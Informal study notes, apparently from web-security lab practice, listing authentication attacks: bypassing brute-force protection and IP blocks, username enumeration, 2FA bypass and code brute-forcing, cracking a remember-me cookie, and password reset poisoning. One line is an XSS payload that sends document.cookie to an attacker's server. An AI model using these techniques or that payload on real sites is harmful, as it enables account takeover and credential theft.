                           Authentication Vulnerability

                       VULNERABLITY IN PASSWORD BASED LOGIN 
                       ====================================                  

IP based bruteforce protection
==============================
 => ip based bruteforce protection can be easily bypassed by manipulating the HTTP request.

 1. identify that X-Forwarded-For header is supported,
 2. when the invalid username is input, the response time is the same bruteforce
    when the valid username is input, the response time increases based on [the length of the password.]
 3. the web first check the username and then password
 4. use Pitchfork attack of Burpsuite




Flawed brute-force protection
=============================
Most common ways to prevent bruteforce attack
----------------------------------------------
1. Locking account if the remote user make too many login fail attempts
2. Block the remote user's IP address if the remote user make too many login fail attempt

Broken bruteforce protection, IP block bypass
---------------------------------------------
1. you can login with your own user credential before every limit is reached(eg. if ip blocks after 2 fail attempts , login at 3rd attempts with correct username and password)
2. use Pitchfork attack of Burpsuite
3. resource pool => maximun concurrence request -> 1 (one request in one time)
4. so we need to write a script for payloads 
eg=> victim_username          guess_password
     victim_username          guess_password
     correct_username         correct_password
 


Username enumeration via account lock
-------------------------------------
1. use cluster bomb attack
2. use 1 username 5 times( to get the correct username)
3. and use it to bruteforce the password with sniper attack



User rate limiting
===================
=> technique to avoid IP blocking

    1.Automatically after a certain period of time has elapsed
    2.Manually by an administrator
    3.Manually by the user after successfully completing a CAPTCHA


HTTP basic authentication
-------------------------

=> client recieves a authentication token from the server, concatenating username and    password and encoding with base64 and stored and managed by browser

=> don't support bruteforce protection

=========================================================================================

                            

                     VULNERABILITIES IN MULTI-FACTOR AUTHENTICATION

   2FA simple bypass
   -----------------

   1. login with user credential 
   2. if the verfication code is asked by server , back to the login home page
   3. then go to the account [BOOM]



   2FA broke logic
   ---------------
    1. login with your username and password and intercept with burp
    2. in asking MFA code step, change username to victim username (to create a MFA code by server)
    3. then add the wrong MFA of your account login step and intercept 
    4. then send to intruder , then change the username and bruteforce the 4 digit of MFA code
    5. THEN BOOMMMMMMM!


========================================================================================

                  VULNERABILITIES IN OTHER AUTHENTICATION MECHANISMS


 => "remember me" token =  persistence cookie


  Brute-forcing a stay-logged-in cookie
  -------------------------------------
  1. first login with correct username and password
  2. stay-login cookie is encoded => base64(username:md5hashofpassword)
  3. clear the session cookie and bruteforce the password and cookie 
    in payload process
    1.hash => MD5
    2.add prefix => victim_user_name
    3.encode => base64encode



Offline passwork cracking
-------------------------
1.login wiht your username and password
2.decode the stay-login-cookie [base64(username:md5hashofpassword)]
3.the site has XSS , so i exploit (<script>[attacker's_exploit_server]+document.cookie</script>)
4. then i got the secret cookies when the victim visit the site
5. decode the cookie and got password(BOOM!)



Password Reset Vulnerability
----------------------------
1. in login form , click forgot password? and intercept with burp
2. got the url with reset password parameter, and test the server if i work when the token is being checked by deleteing the token
3. if it's not check the token
4. change the username and password you want to reset (BOOM!)



Password reset poisoning via middleware
---------------------------------------
1. do forgot password technique with your username and password and stop when you got a reset password link 
2. click forgot passowrd? and intercept with burp
3. in /forgot-password (test whether server support X-Forwarded-Host)
4. if i does, add X-Forwarded-Host : your_server and change username to victim username
5. when victim click the password reset link , you can get the password-reset-token from your access log of your server
5. then use token in your password reset link (BOOM!)



Password brute-force via password change
-----------------------------------------
1. first login with username and password
2. when i change password , response like this
wrong current password => Current password is incorrect
Unmatch new passwords  => New password do not match
3. so brute with password list , by setting unmatch new passwords
4. BOOM!







    











